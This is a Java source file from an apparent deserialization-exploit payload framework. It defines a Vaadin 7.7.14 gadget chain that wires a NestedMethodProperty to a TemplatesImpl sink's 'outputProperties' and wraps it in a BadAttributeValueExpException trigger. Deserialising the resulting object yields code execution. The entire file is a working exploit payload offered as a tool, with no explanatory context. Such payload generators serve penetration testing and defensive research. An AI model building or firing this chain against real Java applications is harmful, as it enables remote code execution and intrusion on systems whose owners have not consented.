package com.ppp.chain.others;

import com.ppp.KickOff;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.vaadin.data.util.NestedMethodProperty;
import com.vaadin.data.util.PropertysetItem;

/**
 * @author Whoopsunix
 * todo
 */
@Dependencies({"com.vaadin:vaadin-server:7.7.14", "com.vaadin:vaadin-shared:7.7.14"})
@Authors({Authors.KULLRICH})
@Sink({Sink.TemplatesImpl})
public class Vaadin implements ObjectPayload<Object> {
    public static void main(String[] args) throws Exception {
        PayloadRunner.run(Vaadin.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(sinkObject);

        return kickOffObject;
    }

    public Object getChain(Object templates) throws Exception {
        PropertysetItem pItem = new PropertysetItem();

        NestedMethodProperty<Object> nmprop = new NestedMethodProperty<Object>(templates, "outputProperties");
        pItem.addItemProperty("outputProperties", nmprop);

        return KickOff.badAttributeValueExpException(pItem);
    }
}
